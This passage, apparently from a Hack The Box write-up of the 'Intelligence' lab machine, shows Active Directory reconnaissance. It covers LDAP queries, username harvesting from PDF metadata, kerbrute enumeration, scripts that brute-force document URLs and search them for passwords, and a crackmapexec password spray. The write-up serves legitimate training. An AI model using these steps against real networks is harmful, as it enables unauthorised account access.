<p>We have anonymous login but we have access to shares so let’s enumerate further.</p>
<h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>let’s do an ldap search for getting naming context for the AD(Active Directory).</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/intelligence]</span><br><span class="line">└─<span class="comment"># ldapsearch -x -h intelligence.htb -s base namingcontexts</span></span><br><span class="line"><span class="comment"># extended LDIF</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LDAPv3</span></span><br><span class="line"><span class="comment"># base &lt;&gt; (default) with scope baseObject</span></span><br><span class="line"><span class="comment"># filter: (objectclass=*)</span></span><br><span class="line"><span class="comment"># requesting: namingcontexts </span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">dn:</span><br><span class="line">namingcontexts: DC=intelligence,DC=htb</span><br><span class="line">namingcontexts: CN=Configuration,DC=intelligence,DC=htb</span><br><span class="line">namingcontexts: CN=Schema,CN=Configuration,DC=intelligence,DC=htb</span><br><span class="line">namingcontexts: DC=DomainDnsZones,DC=intelligence,DC=htb</span><br><span class="line">namingcontexts: DC=ForestDnsZones,DC=intelligence,DC=htb</span><br><span class="line"></span><br><span class="line"><span class="comment"># search result</span></span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"></span><br><span class="line"><span class="comment"># numResponses: 2</span></span><br><span class="line"><span class="comment"># numEntries: 1</span></span><br></pre></td></tr></table></figure>

<p>Looks like it’s normal intelligence.htb so let’s move on from there.</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>Looking through the webpage we can see we can get two PDF so maybe we can get some username from it’s exifdata.<br>so let’s get the two PDF’s.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/intelligence]</span><br><span class="line">└─<span class="comment"># wget http://intelligence.htb/documents/2020-01-01-upload.pdf</span></span><br><span class="line">--2021-07-09 23:58:06--  http://intelligence.htb/documents/2020-01-01-upload.pdf</span><br><span class="line">正在解析主机 intelligence.htb (intelligence.htb)... 10.10.10.248</span><br><span class="line">正在连接 intelligence.htb (intelligence.htb)|10.10.10.248|:80... 已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class="line">长度：26835 (26K) [application/pdf]</span><br><span class="line">正在保存至: “2020-01-01-upload.pdf”</span><br><span class="line"></span><br><span class="line">2020-01-01-upload.pdf            100%[========================================================&gt;]  26.21K  --.-KB/s  用时 0.1s    </span><br><span class="line"></span><br><span class="line">2021-07-09 23:58:06 (188 KB/s) - 已保存 “2020-01-01-upload.pdf” [26835/26835])</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/intelligence]</span><br><span class="line">└─<span class="comment"># wget http://intelligence.htb/documents/2020-12-15-upload.pdf                                                                  </span></span><br><span class="line">--2021-07-09 23:58:18--  http://intelligence.htb/documents/2020-12-15-upload.pdf</span><br><span class="line">正在解析主机 intelligence.htb (intelligence.htb)... 10.10.10.248</span><br><span class="line">正在连接 intelligence.htb (intelligence.htb)|10.10.10.248|:80... 已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class="line">长度：27242 (27K) [application/pdf]</span><br><span class="line">正在保存至: “2020-12-15-upload.pdf”</span><br><span class="line"></span><br><span class="line">2020-12-15-upload.pdf            100%[========================================================&gt;]  26.60K   112KB/s  用时 0.2s    </span><br><span class="line"></span><br><span class="line">2021-07-09 23:58:19 (112 KB/s) - 已保存 “2020-12-15-upload.pdf” [27242/27242])</span><br></pre></td></tr></table></figure>

<p>So now let’s try and see it’s exifdata from that PDF.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/intelligence]</span><br><span class="line">└─<span class="comment"># exiftool 2020-01-01-upload.pdf </span></span><br><span class="line">ExifTool Version Number         : 12.16</span><br><span class="line">File Name                       : 2020-01-01-upload.pdf</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 26 KiB</span><br><span class="line">File Modification Date/Time     : 2021:04:01 13:00:00-04:00</span><br><span class="line">File Access Date/Time           : 2021:07:09 23:58:06-04:00</span><br><span class="line">File Inode Change Date/Time     : 2021:07:09 23:58:06-04:00</span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : PDF</span><br><span class="line">File Type Extension             : pdf</span><br><span class="line">MIME Type                       : application/pdf</span><br><span class="line">PDF Version                     : 1.5</span><br><span class="line">Linearized                      : No</span><br><span class="line">Page Count                      : 1</span><br><span class="line">Creator                         : William.Lee</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/intelligence]</span><br><span class="line">└─<span class="comment"># exiftool 2020-12-15-upload.pdf</span></span><br><span class="line">ExifTool Version Number         : 12.16</span><br><span class="line">File Name                       : 2020-12-15-upload.pdf</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 27 KiB</span><br><span class="line">File Modification Date/Time     : 2021:04:01 13:00:00-04:00</span><br><span class="line">File Access Date/Time           : 2021:07:09 23:58:19-04:00</span><br><span class="line">File Inode Change Date/Time     : 2021:07:09 23:58:19-04:00</span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : PDF</span><br><span class="line">File Type Extension             : pdf</span><br><span class="line">MIME Type                       : application/pdf</span><br><span class="line">PDF Version                     : 1.5</span><br><span class="line">Linearized                      : No</span><br><span class="line">Page Count                      : 1</span><br><span class="line">Creator                         : Jose.Williams</span><br></pre></td></tr></table></figure>

<p>Looks like we have two usernames Jose.Williams and William.Lee so let’s create a wordlist with different combination from their names and then brute it with kerbrute.</p>
<h2 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h2><p>Thinking about the wordlist I came up with this wordlist below.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">William</span><br><span class="line">Jose.Williams </span><br><span class="line">William.Lee</span><br><span class="line">Jwilliams</span><br><span class="line">JWilliams</span><br><span class="line">WLee</span><br><span class="line">Wlee</span><br><span class="line">LWilliams</span><br><span class="line">Lwilliams</span><br><span class="line">WJose</span><br><span class="line">Wjose</span><br><span class="line">wJose</span><br><span class="line">wjose</span><br><span class="line">lWilliams</span><br><span class="line">lwilliams</span><br><span class="line">wlee</span><br><span class="line">wLee</span><br><span class="line">jWilliams</span><br><span class="line">jwilliams</span><br></pre></td></tr></table></figure>

<p>In this case you don’t need to create this wordlist cause the author name is one of the usernames but in Real like scenario or the in some difficult CTF you might need to create the wordlist as above.</p>
<p>Let’s move on and try kerbrute on the AD.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Intelligence$ ~/Git/kerbrute/dist/kerbrute userenum --dc intelligence.htb -d intelligence.htb user.txt </span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: dev (1ad284a) - 07/04/21 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2021/07/04 07:37:21 &gt;  Using KDC(s):</span><br><span class="line">2021/07/04 07:37:21 &gt;   intelligence.htb:88</span><br><span class="line"></span><br><span class="line">2021/07/04 07:37:22 &gt;  [+] VALID USERNAME:       William.Lee@intelligence.htb</span><br><span class="line">2021/07/04 07:37:22 &gt;  [+] VALID USERNAME:       Administrator@intelligence.htb</span><br><span class="line">2021/07/04 07:37:22 &gt;  Done! Tested 21 usernames (2 valid) <span class="keyword">in</span> 0.804 seconds</span><br></pre></td></tr></table></figure>
<p>So now we have two users before bruting the password let’s try and check for some low hanging fruits like GetNpuser.<br>Got nothing from that so I though that there could be something else so I went on to check PDF’s.</p>
<h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><p>So I checked the naming of PDF is using the date and then followed by upload. so I tried to brute all the dates to get if there are anymore PDF’s.<br>The below script will create a new PDF directory and download all pdf in that directory.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://intelligence.htb/documents/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2020</span>,<span class="number">2022</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">13</span>):</span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">31</span>):</span><br><span class="line">			date = <span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>-<span class="subst">&#123;j:02&#125;</span>-<span class="subst">&#123;k:02&#125;</span>-upload.pdf&#x27;</span></span><br><span class="line">			r = requests.get(url+date)</span><br><span class="line">			<span class="comment">#print (r.text)</span></span><br><span class="line">			<span class="keyword">if</span> (r.status_code == <span class="number">200</span>):</span><br><span class="line">				<span class="built_in">print</span> (date)</span><br><span class="line">				<span class="comment">#text = r.text</span></span><br><span class="line">				os.system(<span class="string">&#x27;mkdir pdf&#x27;</span>)</span><br><span class="line">				os.system(<span class="string">f&#x27;wget <span class="subst">&#123;url&#125;</span><span class="subst">&#123;date&#125;</span> -O pdf/<span class="subst">&#123;date&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>Now as the nummber of PDF files was more I wrote another python script to extract<br>the usernames.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;ls -al pdf/&#x27;</span>)</span><br><span class="line">lst = io.recvrepeat(<span class="number">1</span>).decode().strip().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">files = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="built_in">len</span>(lst)):</span><br><span class="line">	tmp = lst[i].split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">	files.append(tmp[<span class="number">10</span>])</span><br><span class="line"><span class="comment">#print (files)</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;users.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:</span><br><span class="line">	io.sendline(<span class="string">f&#x27;exiftool pdf/<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">	tmp = (io.recvrepeat(<span class="number">1</span>).decode().strip().split(<span class="string">&#x27;: &#x27;</span>))</span><br><span class="line">	f.write(tmp[-<span class="number">1</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span> (tmp[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>And it will create users.txt for you.<br>now after getting users.txt you can retry NPUsers.py but it won’t help so let’s dig more into PDF.<br>Now searching for password in pdf I wrote this simple python script to make my job easy.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pdfminer.high_level <span class="keyword">import</span> extract_text</span><br><span class="line"></span><br><span class="line">files = [<span class="string">&#x27;2020-01-01-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-01-02-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-01-04-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-01-10-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-01-20-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-01-22-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-01-23-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-01-25-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-01-30-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-02-11-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-02-17-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-02-23-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-02-24-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-02-28-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-03-04-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-03-05-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-03-12-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-03-13-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-03-17-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-03-21-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-04-02-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-04-04-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-04-15-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-04-23-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-05-01-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-05-03-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-05-07-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-05-11-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-05-17-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-05-20-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-05-21-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-05-24-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-05-29-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-06-02-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-06-03-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-06-04-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-06-07-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-06-08-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-06-12-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-06-14-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-06-15-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-06-21-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-06-22-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-06-25-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-06-26-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-06-28-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-06-30-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-07-02-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-07-06-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-07-08-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-07-20-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-07-24-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-08-01-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-08-03-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-08-09-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-08-19-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-08-20-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-09-02-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-09-04-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-09-05-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-09-06-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-09-11-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-09-13-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-09-16-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-09-22-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-09-27-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-09-29-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-09-30-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-10-05-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-10-19-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-11-01-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-11-03-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-11-06-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-11-10-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-11-11-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-11-13-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-11-24-upload.pdf&#x27;</span>, <span class="string">&#x27;2020-11-30-upload.pdf&#x27;</span>]</span><br><span class="line"><span class="comment">#keywords = [&#x27;user&#x27;,&#x27;username&#x27;,&#x27;pass&#x27;,&#x27;password&#x27;]</span></span><br><span class="line">keywords = <span class="string">&#x27;user&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:</span><br><span class="line">	text = extract_text(<span class="string">&#x27;pdf/&#x27;</span>+i)</span><br><span class="line">	<span class="keyword">if</span>(keywords <span class="keyword">in</span> text):</span><br><span class="line">		<span class="built_in">print</span> (i)</span><br><span class="line">		<span class="built_in">print</span> (text)</span><br></pre></td></tr></table></figure>

<p>So this will give you the following output.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/intelligence]</span><br><span class="line">└─<span class="comment"># python3 getpass.py </span></span><br><span class="line">2020-06-04-upload.pdf</span><br><span class="line">New Account Guide</span><br><span class="line"></span><br><span class="line">Welcome to Intelligence Corp!</span><br><span class="line">Please login using your username and the default password of:</span><br><span class="line">NewIntelligenceCorpUser9876</span><br><span class="line"></span><br><span class="line">After logging <span class="keyword">in</span> please change your password as soon as possible.</span><br></pre></td></tr></table></figure>

<p>So now we have default password so let’s try and spray that password at our username I tried kerbrute but didn’t yeild anything then I tried crackmapexec.</p>
<h2 id="Crackmapexec"><a href="#Crackmapexec" class="headerlink" title="Crackmapexec"></a>Crackmapexec</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/intelligence]</span><br><span class="line">└─<span class="comment"># crackmapexec smb 10.10.10.248 -u users.txt -p NewIntelligenceCorpUser9876</span></span><br><span class="line">SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         